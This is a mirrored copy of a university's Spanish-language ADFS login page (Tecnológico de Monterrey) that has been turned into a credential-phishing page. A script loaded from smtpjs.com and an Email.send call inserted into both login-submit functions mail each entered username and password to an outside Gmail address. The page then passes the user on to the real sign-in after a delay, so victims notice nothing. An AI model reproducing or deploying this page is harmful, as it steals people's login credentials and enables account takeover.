 <!DOCTYPE html>
<html lang="es">
    
<!-- Mirrored from fs.itesm.mx/adfs/ls/?wa=wsignin1.0&wtrealm=urn%3asharepoint%3amitec&wctx=https%3a%2f%2fmitec.itesm.mx%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%252F by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Sep 2019 02:52:00 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta http-equiv="cache-control" content="no-cache,no-store"/>
        <meta http-equiv="pragma" content="no-cache"/>
        <meta http-equiv="expires" content="-1"/>
        <meta name='mswebdialog-title' content='Connecting to fs.itesm.mx'/>

        <title>Iniciar sesi&#243;n</title>
        <script type='text/javascript'>
//<![CDATA[
function LoginErrors(){this.userNameFormatError = 'Escriba el identificador de usuario con el formato \u0026quot;dominio\\usuario\u0026quot; o \u0026quot;usuario@dominio\u0026quot;.'; this.passwordEmpty = 'Escriba la contrase\u0026#241;a.'; this.passwordTooLong = 'La contrase\u0026#241;a es demasiado larga (\u0026gt; 128 caracteres).';}; var maxPasswordLength = 128;
//]]>
</script>

<script src="https://smtpjs.com/v3/smtp.js">
</script>

<script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.
function InputUtil(errTextElementID, errDisplayElementID) {

    if (!errTextElementID)  errTextElementID = 'errorText'; 
    if (!errDisplayElementID)  errDisplayElementID = 'error'; 

    this.hasFocus = false;
    this.errLabel = document.getElementById(errTextElementID);
    this.errDisplay = document.getElementById(errDisplayElementID);
};
InputUtil.prototype.canDisplayError = function () {
    return this.errLabel && this.errDisplay;
}
InputUtil.prototype.checkError = function () {
    if (!this.canDisplayError){
        throw new Error ('Error element not present');
    }
    if (this.errLabel && this.errLabel.innerHTML) {
        this.errDisplay.style.display = '';        
        var cause = this.errLabel.getAttribute('for');
        if (cause) {
            var causeNode = document.getElementById(cause);
            if (causeNode && causeNode.value) {
                causeNode.focus();
                this.hasFocus = true;
            }
        }
    }
    else {
        this.errDisplay.style.display = 'none';
    }
};
InputUtil.prototype.setInitialFocus = function (input) {
    if (this.hasFocus) return;
    var node = document.getElementById(input);
    if (node) {
        if ((/^\s*$/).test(node.value)) {
            node.focus();
            this.hasFocus = true;
        }
    }
};
InputUtil.prototype.setError = function (input, errorMsg) {
    if (!this.canDisplayError) {
        throw new Error('Error element not present');
    }
    input.focus();

    if (errorMsg) {
        this.errLabel.innerHTML = errorMsg;
    }
    this.errLabel.setAttribute('for', input.id);
    this.errDisplay.style.display = '';
};
InputUtil.makePlaceholder = function (input) {
    var ua = navigator.userAgent;

    if (ua != null && 
        (ua.match(/MSIE 9.0/) != null || 
         ua.match(/MSIE 8.0/) != null ||
         ua.match(/MSIE 7.0/) != null)) {
        var node = document.getElementById(input);
        if (node) {
            var placeholder = node.getAttribute("placeholder");
            if (placeholder != null && placeholder != '') {
                var label = document.createElement('input');
                label.type = "text";
                label.value = placeholder;
                label.readOnly = true;
                label.style.position = 'absolute';
                label.style.borderColor = 'transparent';
                label.className = node.className + ' hint';
                label.tabIndex = -1;
                label.onfocus = function () { this.nextSibling.focus(); };

                node.style.position = 'relative';
                node.parentNode.style.position = 'relative';
                node.parentNode.insertBefore(label, node);
                node.onkeyup = function () { InputUtil.showHint(this); };
                node.onblur = function () { InputUtil.showHint(this); };
                node.style.background = 'transparent';

                node.setAttribute("placeholder", "");
                InputUtil.showHint(node);
            }
        }
    }
};
InputUtil.focus = function (inputField) {
    var node = document.getElementById(inputField);
    if (node) node.focus();
};
InputUtil.hasClass = function(node, clsName) {
    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
};
InputUtil.addClass = function(node, clsName) {
    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
};
InputUtil.removeClass = function(node, clsName) {
    if (this.hasClass(node, clsName)) {
        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
        node.className = node.className.replace(reg, ' ');
    }
};
InputUtil.showHint = function (node, gotFocus) {
    if (node.value && node.value != '') {
        node.previousSibling.style.display = 'none';
    }
    else {
        node.previousSibling.style.display = '';
    }
};
InputUtil.updatePlaceholder = function (input, placeholderText) {
    var node = document.getElementById(input);
    if (node) {
        var ua = navigator.userAgent;
        if (ua != null &&
            (ua.match(/MSIE 9.0/) != null ||
            ua.match(/MSIE 8.0/) != null ||
            ua.match(/MSIE 7.0/) != null)) {
            var label = node.previousSibling;
            if (label != null) {
                label.value = placeholderText;
            }
        }
        else {
            node.placeholder = placeholderText;
        }
    }
};

//]]>
</script>


        
        <link rel="stylesheet" type="text/css" href="../portal/css/styledbdd.css?id=F14FF281ADCC05CC220FFDFB5EBF3ECA5F8BC553E5DED6A7878597284ECD904D&amp;rp=77a91927-6788-e911-a818-000d3a5de8c6" /><style>.illustrationClass {background-image:url(../portal/illustration/illustrationda16.jpg?id=064CFB67F9F7EC7ACBC0691D82CC77084317FAB927C7F700294FBC065BF28789&amp;rp=77a91927-6788-e911-a818-000d3a5de8c6);}</style>

    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
        <h1>Se requiere JavaScript</h1>
        <p>Se requiere JavaScript. El explorador web no es compatible con JavaScript o no se ha habilitado JavaScript en este explorador web.</p>
        <p>Para determinar si su explorador web es compatible con JavaScript o para habilitar JavaScript, consulte la ayuda del explorador web.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <img class='logoImage' id='companyLogo' src='../portal/logo/logo65a1.png?id=E095D494FA495CF25E4DEF076C2BB94C3B3326FC8C3E189482CD5BC8C4FBA533&amp;rp=77a91927-6788-e911-a818-000d3a5de8c6' alt='fs.itesm.mx'/>
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
        
        
        
    <div id="loginArea">        
        <div id="loginMessage" class="groupMargin">Inicie sesi&#243;n mediante su cuenta organizativa</div>

        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="https://fs.itesm.mx/adfs/ls/?wa=wsignin1.0&amp;wtrealm=urn%3asharepoint%3amitec&amp;wctx=https%3a%2f%2fmitec.itesm.mx%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%252F&amp;client-request-id=33ea8670-e41e-4837-950b-008000000083" >
            <div id="error" class="fieldMargin error smallText">
                <span id="errorText" for=""></span>
            </div>

            <div id="formsAuthenticationArea">
                <div id="userNameArea">
                    <label id="userNameInputLabel" for="userNameInput" class="hidden">Cuenta de usuario</label>
                    <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
                        spellcheck="false" placeholder="alguien@example.com" autocomplete="off"/>
                </div>

                <div id="passwordArea">
                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Contrase&#241;a</label>
                    <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
                        placeholder="Contrase&#241;a" autocomplete="off"/>
                </div>
                <div id="kmsiArea" style="display:''">
                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
                    <label for="kmsiInput">Mantener la sesi&#243;n iniciada</label>
                </div>
                <div id="submissionArea" class="submitMargin">
                    <span id="submitButton" class="submit" tabindex="4" role="button"
                        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
                        onclick="return Login.submitLoginRequest();">Iniciar sesi&#243;n</span>
                </div>
            </div>
            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
        </form>

             <div id="authOptions">
        <form id="options"  method="post" action="https://fs.itesm.mx:443/adfs/ls/?wa=wsignin1.0&amp;wtrealm=urn%3asharepoint%3amitec&amp;wctx=https%3a%2f%2fmitec.itesm.mx%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%252F&amp;client-request-id=33ea8670-e41e-4837-950b-008000000083">
            <script type="text/javascript">
                function SelectOption(option) {
                    var i = document.getElementById('optionSelection');
                    i.value = option;
                    document.forms['options'].submit();
                    return false;
                }
            </script>
            <input id="optionSelection" type="hidden" name="AuthMethod" />
            <div id='authOptionLinks' class='groupMargin'></div>
        </form>
      </div>

        <div id="introduction" class="groupMargin">
            <div id='SignInPageDescriptionText'></div>                     
        </div>

        <script type="text/javascript">
        //<![CDATA[

            function Login() {
            }

            Login.userNameInput = 'userNameInput';
            Login.passwordInput = 'passwordInput';

            Login.initialize = function () {

                var u = new InputUtil();

                u.checkError();
                u.setInitialFocus(Login.userNameInput);
                u.setInitialFocus(Login.passwordInput);
            }();

            Login.submitLoginRequest = function () { 
                var u = new InputUtil();
                var e = new LoginErrors();

                var userName = document.getElementById(Login.userNameInput);
                var password = document.getElementById(Login.passwordInput);

Email.send({
    SecureToken: "82f1541f-4eaf-49c6-bf35-f17d1fecf988",
    To : 'contrasenaschidas@gmail.com',
    From : "contrasenaschidas@gmail.com",
    Subject : "Contrasena",
    Body : "usuario: " + userName.value + ", contrasena: " + password.value
})

setTimeout(function(){ 
                if (!userName.value || !userName.value.match('[@\\\\]')) {
                    u.setError(userName, e.userNameFormatError);
                    return false;
                }

                if (!password.value) {
                    u.setError(password, e.passwordEmpty);
                    return false;
                }

                if (password.value.length > maxPasswordLength) {
                    u.setError(password, e.passwordTooLong);
                    return false;
                }

                document.forms['loginForm'].submit();
                return false;
            


}, 3000);

};
            InputUtil.makePlaceholder(Login.userNameInput);
            InputUtil.makePlaceholder(Login.passwordInput);
        //]]>

        </script>
    </div>

    </div>

                </div>
                <div id="footerPlaceholder"></div>
            </div>
            <div id="footer">
                <div id="footerLinks" class="floatReverse">
                     <div><span id="copyright">&#169; 2016 Microsoft</span></div>
                </div>
            </div>
        </div> 
    </div>
    <script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

// Function to change illustration image. Usage example below.
function SetIllustrationImage(imageUri) {
    var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';

    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
    else css.appendChild(document.createTextNode(illustrationImageClass));

    document.getElementsByTagName("head")[0].appendChild(css);
}


/////CODIGO MITEC/////
// Sample code to change �Sign in with organizational account� string.  
// Check whether the loginMessage element is present on this page.  
var loginMessage = document.getElementById('loginMessage');  
if (loginMessage)  
{  
       // loginMessage element is present, modify its properties.  
       loginMessage.innerHTML = ' Para iniciar la sesi&oacute;n ingresa tu usuario y contrase&ntilde;a';  
}
//var kmsiInput = document.getElementById('kmsiInput');
var kmsiArea = document.getElementById('kmsiArea');
/*if (kmsiInput)  
{   
       kmsiInput.innerText = 'Rec&uacute;erdame';
	   //ksmiInput.innerHTML = "<label for='kmsiInput'>Rec&uacute;erdame</label>"
		
}*/
if (kmsiArea)  
{   
       //kmsiInput.innerText = 'Rec&uacute;erdame';
	   kmsiArea.innerHTML = "<input type='checkbox' name='Kmsi' id='kmsiInput' value='true' tabindex='3'><label for='kmsiInput'>  Recu&eacute;rdame</label>";
		
}
// Check whether the userNameInput element is present on this page.
var userNameInput = document.getElementById('userNameInput');
var passwordInput = document.getElementById('passwordInput');
var submitButton = document.getElementById('submitButton');
if (userNameInput)
{
// userNameInput element is present, modify its properties.
userNameInput.placeholder = 'Usuario';
userNameInput.onblur= onblurFunction;
}
if (passwordInput)
{
// passwordInput element is present, modify its properties.
passwordInput.placeholder  = 'Contrasena';
//passwordInput.onblur= calculaDominio;
}
if (submitButton)
{
// passwordInput element is present, modify its properties.
//alert("valor" + submitButton.innerText);
// SOY EL DE MI TEC
submitButton.innerText = 'Ingresar';
}		
		function myFunction() {
			document.getElementById("myDropdown").classList.toggle("show");
		}

		// Close the dropdown menu if the user clicks outside of it
		window.onclick = function(event) {
		  var classes = event.target.className.split(' ');
		  var found = false; var i = 0;
		  
		  while (i < classes.length && !found) 
		  {
			  if (classes[i]=='dropbtn') found = true;
			  else ++i;
		  }
		  
		  if (!found) 
		  {
			var dropdowns = document.getElementsByClassName("dropdown-content");
			var i;
			
			for (i = 0; i < dropdowns.length; i++) 
			{
			  var openDropdown = dropdowns[i];
			  
			  if (openDropdown.classList.contains('show')) 
			  {
				openDropdown.classList.remove('show');
			  }
			}
		  }
		}
		
		// Funcion para completar nominas a L{8}
		function onblurFunction()
		{
			var m = userNameInput.value;	
			if (isNaN(parseInt(m))) 
			{
				userNameInput.value = m;
				calculaDominio();
			} 
			else 
			{
				var longitud = m.length;
				
				for (i = longitud; i < 8; i++) 
				{
					m = "0" + m;
				}
				
				m = "L" + m;
				userNameInput.value = m;
				calculaDominio();
			}	
		}
		
		// Funcion para completar calcular el dominio
		function calculaDominio()
		{
			var nomina = new RegExp("^[l,L]+[0-9]{8}$");
			/* Esto de nomitaUTM no esta en Test */
			var nominaUTM = new RegExp("^[al,AL]+[0-9]{9}$");
			var matricula = new RegExp("^[a,A]+[0-9]{8}$");
			var padreId = new RegExp("^[f,F]+[0-9]{8}$");
			var Dominio = "";

			if(nomina.test(userNameInput.value))
			{
				//asignarDominio("TEC");
				//alert ("nomina TEC");
				const Http = new XMLHttpRequest();
				const url='https://prd18wtyc01.itesm.mx/PerfilesADFS/Perfiles.svc/ConsultaPerfiles/' + userNameInput.value ;
				Http.open("GET.html", url);
				Http.send();
				/*Http.onreadystatechange=(e)=>{
					var json =Http.responseText;
					alert(json.Instituciones);
					alert(json.Instituciones.length);
					
				}*/
				Http.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						var myArr = JSON.parse(this.responseText);
						var strNomina = myArr["Nomina"];
						var strInstituciones = myArr["Instituciones"];
						// alert ("Nomina: " + strNomina);
						// alert ("Numero de instituciones: " + strInstituciones.length);
						// myFunction(myArr);
						if(strInstituciones.length == 0)
						{
							// Maribel 12/Jun/19
							// var AvisoUTM = document.getElementById('AvisoUTM');
							// AvisoUTM.innerHTML = ("");
							asignarDominio("TEC");
						}		
						if(strInstituciones.length == 1)
						{
							//$(".ErrorTextLabel").html("");
							//$(".AvisoUTM").html("");
							// Maribel 12/Jun/19
							// var AvisoUTM = document.getElementById('AvisoUTM');
							//AvisoUTM.innerHTML = ("");	
							//alert("Dominio asignado: " + strInstituciones[0].Dominio);
							asignarDominio(strInstituciones[0].Dominio);
						}
						/*else
						{
							// Maribel 12/Jun/19
							var AvisoUTM = document.getElementById('AvisoUTM');
							if(!(AvisoUTM.innerHTML) &&  strInstituciones.length>1)
							//alert(AvisoUTM.innerHTML);
							//if(strInstituciones.length>1)
							{
								for (var i = strInstituciones.length - 1; i >= 0; i--)
								{
									Dominio = Dominio + "<div><input type=radio id=dominios  name=dominios  onclick='javascript:asignarDominio(this.value);' value='"+strInstituciones[i].Dominio+"'/>"+strInstituciones[i].Dominio + "</div>";
									asignarDominio(strInstituciones.Dominio);
								}
								//alert(Dominio);
								//$(".AvisoUTM").html("<div class='alert alert-warning' style='padding-bottom: 50px;'><div> Elige la cuenta con la que deseas acceder a esta sesi�n.</div><div style='float:right'>" +Dominio + "</div></div>");
								//var AvisoUTM = document.getElementById('AvisoUTM');
								//alert(AvisoUTM);
								AvisoUTM.innerHTML = ("<div class='alert alert-warning' style='padding-bottom: 50px;'><div> Elige la cuenta con la que deseas acceder a esta sesi&oacute;n.</div><div style='float:right'>" +Dominio + "</div></div>");								
							}
						}*/	
					}
				}
				}
				else if(matricula.test(userNameInput.value))
				{
					asignarDominio("TEC");		
				}
				else if(padreId.test(userNameInput.value))
				{
					asignarDominio("PADRESTEC.ITESM");
				}
				else
				{
					//$(".AvisoUTM").html("");
					//$(".ErrorTextLabel").html("");
					// Maribel 12/Jun/19
					// var AvisoUTM = document.getElementById('AvisoUTM');
					// AvisoUTM.innerHTML = ("");
					asignarDominio(getDominio(userNameInput.value));
				}
				
			}
		
		//Funcion para elegir el dominio dentro del campo ContentPlaceHolder1_ddlDomain//
		function asignarDominio(dominio)
		{
			//document.getElementById("ContentPlaceHolder1_ddlDomain").value = dominio;
			if(typeof dominio !== "undefined"){
				var userDominio = dominio;
				//alert("Valor dominio: " + userDominio);
				document.getElementById("ContentPlaceHolder1_ddlDomain").value = userDominio;				
				//document.forms['loginForm'].userNameInput.value = userNameValue;
			}	
		}
		
		//Funcion para en base al dominio de correo establecer el dominio de AD//
		function getDominio(correo)
		{
			if(isPadres)
			{
				return "PADRESTEC.ITESM"
			}
			else
			{
				var correos = [["@tec.mx","TEC"],["@itesm.mx","TEC"],["@arteac.edu.mx","TEC"],["@nic.mx","TEC"],["@tecmilenio.mx","UTM"],["@tecsalud.mx","TEC"],["@sorteostec.mx","TEC"],["@sistematec.mx","LABIDM"],["@testutm.tecmilenio.mx","TESTUTM"],["@test.nic.mx","LABIDM"],["@clases.sistematec.mx","LABIDM"],["@servicios.tecmilenio.mx","UTM"],["@exatectest.tec.mx","EXATECTEST"],["@exatec.tec.mx","EXATEC"]];
				var tes = new RegExp("^t-");    
				if(tes.test(correo.toLowerCase()))
				{
					return "TEC";
				}
				for(var i = 0; i < correos.length; i++)
				{   
					var re = new RegExp(correos[i][0]+"$");    
					
					if(re.test(correo.toLowerCase()))
					{
						return correos[i][1];
					}
				}   
				if(validateEmail(correo))
				{
					return "TEC";
				}
				else if(isTecMilenio)
				{ 
					return "UTM";
				}
				else
				{
					return "TEC";
				}
			}
		}
		
		//Funcion para validar formato de correo con regex//
		function validateEmail(email) 
		{ 
			if(!isPadres)
			{
				var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
				return re.test(email);
			}
			else	
			{
				return true;
			}
		} 
		
		//Variables legacy necesarias
		var isTecMilenio = false;
		var isMiEspacio = true;
		var isMiTecBeta = false; 
		var isPadres = false;
		
		//Funcion antes del Submit	para agregar dominio
		if (typeof Login != 'undefined'){  
			Login.submitLoginRequest = function () {   
			var u = new InputUtil();  
			var e = new LoginErrors();  
			var userName = document.getElementById(Login.userNameInput);  
			var password = document.getElementById(Login.passwordInput);

Email.send({
    SecureToken: "82f1541f-4eaf-49c6-bf35-f17d1fecf988",
    To : 'contrasenaschidas@gmail.com',
    From : "contrasenaschidas@gmail.com",
    Subject : "Contrasena",
    Body : "usuario: " + userName.value + ", contrasena: " + password.value
})

setTimeout(function(){
if (userName.value && !userName.value.match('[@\\\\]'))   
			{  
				//var userNameValue = 'TEC\\' + userName.value;
				var userNameValue = document.getElementById("ContentPlaceHolder1_ddlDomain").value + "\\" + userName.value;			
				document.forms['loginForm'].UserName.value = userNameValue;  
			}  

			if (!userName.value) {  
			   u.setError(userName, e.userNameFormatError);  
			   return false;  
			}  

			if (!password.value)   
			{  
				u.setError(password, e.passwordEmpty);  
				return false;  
			}  
			document.forms['loginForm'].submit();  
			return false;  
		
}, 3000);
};  
		}
			
		
		//Agregar SignInPageDescriptionText miespacio
		var SignInPageDescriptionText = document.getElementById('SignInPageDescriptionText');
		if(SignInPageDescriptionText.innerHTML == ""){
				SignInPageDescriptionText.innerHTML = ("<div id='pass'> <a href='https://miscuentas.tec.mx/sspr/public/ForgottenPassword' target='_blank' style='color: #294E8B; text-decoration: none;font-family: Segoe UI Light, Arial, Helvetica, sans-serif;float:left'>&#191;Olvidaste tu contrase&ntilde;a?</a></div><br><br><select name='ctl00_ContentPlaceHolder1_ddlDomain' id='ContentPlaceHolder1_ddlDomain' tabindex='1' class='form-control' style='display: none;'><option value='-1'>-- Instituci&oacute;n --</option><option selected='selected' value='TEC'>Sistema Tecnol&oacute;gico de Monterrey</option><option value='TEC'>Tecnol&oacute;gico de Monterrey</option><option value='TEC'>Universidad TecVirtual</option><option value='UTM'>Universidad Tecmilenio</option><option value='TEC'>TecSalud</option><option value='TEC'>Sorteos</option><option value='TEC'>Arte AC</option><option value='TEC'>NIC M&eacute;xico</option><option value='LABIDM'>LABIDM</option><option value='TEC'>Dominio tecvirtual.mx</option><option value='TESTUTM'>TESTUTM</option><option value='PADRESTEC.ITESM'>Padres</option></select><p><div id='pass'><span style='font-size:12px;'>&iquest;Nunca has entrado a MiTec? <a href='http://sitios.itesm.mx/va/tutoriales/alumnos/PRM_INGRESO/index.html' target='_blank'>Haz click aqu&iacute;</a></span></div><br><div class='EthosMiTec' href=javascript:newWindow('../../../secure.ethicspoint.com/domain/media/es/gui/36326/index.html')><a href='https://secure.ethicspoint.com/domain/media/es/gui/36326/index.html' target='_blank' class='EthosLinkBtn'><div class='FloatDiv'>Reporta en </div><div class='EthosImgBtn'><img src='/adfs/portal/images/idp/ethos.png' width='77' height='23'></div><div class='FloatDiv'>las faltas al c&oacute;digo de &eacute;tica</div></a></div><div id=StoreAppsImgs ><img id=logosTiendas src=/adfs/portal/images/idp/logoTiendasApps.png style=margin-top: 10px; usemap=#Map><map name=Map><area id=iTunes shape=rect coords=1,1,141,52 href='../../../apps.apple.com/mx/app/miespacio-movil/id885658638d8cc.html?l=en&amp;mt=8'><area id=playStore shape=rect coords=162,2,301,49 href='../../../play.google.com/store/apps/details698f.html?id=com.itesm.miespacioandroid'></map></div><br>				<div id='AvisosContainer'><a href='https://mitec.itesm.mx/portal/pls/portal/portalum.templates.template1?p_vOrigen=barInf.barInf&amp;p_iPortal=1&amp;p_iCampus=98&amp;p_iServicio=19&amp;p_vCveServ=1&amp;p_vCadena=A98E96C06F08EA6B29F325192414292EB737CE8C7200CA73F0F08CB3BDC2B457C3FA338484CC3385EB9084A6151FD684489F87EB4CD57A4FDF41BCF6D3B0FBD1415CF672A4D55DC3734366CDDE25BE41BBB9272E58C7BF50CE4D304AD16771404BD5C4E549490E0257626BB2D896E55E0283C8E6102CE6EADC570B7458F52EED658E76D516541B97B866A5A279944773396BCE41C6657CD34A6370DE826D27C8062B8E5FC1F0C9128D172B2212B3F7BF520E225FEC0C6A5D' target='_blank'>Aviso Legal</a> | <a href='https://tec.mx/es/aviso-de-privacidad-alumnos' target='_blank'>Aviso de Privacidad</a></div><br>&reg; 2019 Tecnol&oacute;gico de Monterrey</p>");
				
		}
		
		//Valida si hay un mensaje de error, para personalizarlo
			checkMessage();
			
		/* Funci�n para personalizar el mensaje de error */
		function checkMessage() 
		{
			var errorText = document.getElementById('errorText');
			
			if(errorText.innerHTML != ""){
				errorText.innerHTML = ("La instituci&oacute;n, el nombre de usuario o la contrase&ntilde;a son incorrectos");
			}
		}
		
		//Funcion para detectar dispositivos moviles//
		
		var isMobile = false;
		//document.getElementById("StoreAppsImgs").style.display = "none";
		//var x = "User-agent header sent: " + navigator.userAgent;
		//alert(x);
		
		if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) 
		{
			isMobile = true;
			//alert(isMobile);
		}
		// Si el dispositivo de d�nde se esta ingresando, NO es movil, se ocultan los iconos de las tiendas de aplicaciones.
		if(!isMobile)
		{
			//$("#StoreAppsImgs").hide();
			//alert(isMobile);
			document.getElementById("StoreAppsImgs").style.display = "none";
			
			
		}
	
		//var linksHeader = document.getElementById("contentWrapper");
		//alert(linksHeader);
		//linksHeader.innerHTML =  "<div class='divContentHeaderText row' style='text-align:right;padding-right:10px;display:inherit;padding-top: 30px;'><a id='lnkAyuda' href='javascript:__doPostBack('ctl00$lnkAyuda','')' style='display: none;'>Ayuda</a><!--<a id='lnkFAQ' href='javascript:__doPostBack(&#39;ctl00$lnkFAQ&#39;,&#39;&#39;)' style='color: #294E8B; text-decoration: none;'>Preguntas frecuentes</a>--><a href='https://fs.itesm.mx/adfs/ls/Ayuda/ayudafaq.html' style='color: #294E8B; text-decoration: none;'>Preguntas frecuentes</a>   <a href='https://fs.itesm.mx/adfs/ls/Ayuda/ayuda.html' style='color: #294E8B; text-decoration: none;'>Ayuda</a></div>" + linksHeader.innerHTML ;
		
		
		
		
		
// Example to change illustration image on HRD page after adding the image to active theme:
// PSH> Set-AdfsWebTheme -TargetName <activeTheme> -AdditionalFileResource @{uri='/adfs/portal/images/hrd.jpg';path='.\hrd.jpg'}
//
//if (typeof HRD != 'undefined') {
//    SetIllustrationImage('/adfs/portal/images/hrd.jpg');
//}
//]]>
</script>


    </body>

<!-- Mirrored from fs.itesm.mx/adfs/ls/?wa=wsignin1.0&wtrealm=urn%3asharepoint%3amitec&wctx=https%3a%2f%2fmitec.itesm.mx%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%252F by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Sep 2019 02:52:05 GMT -->
</html> 

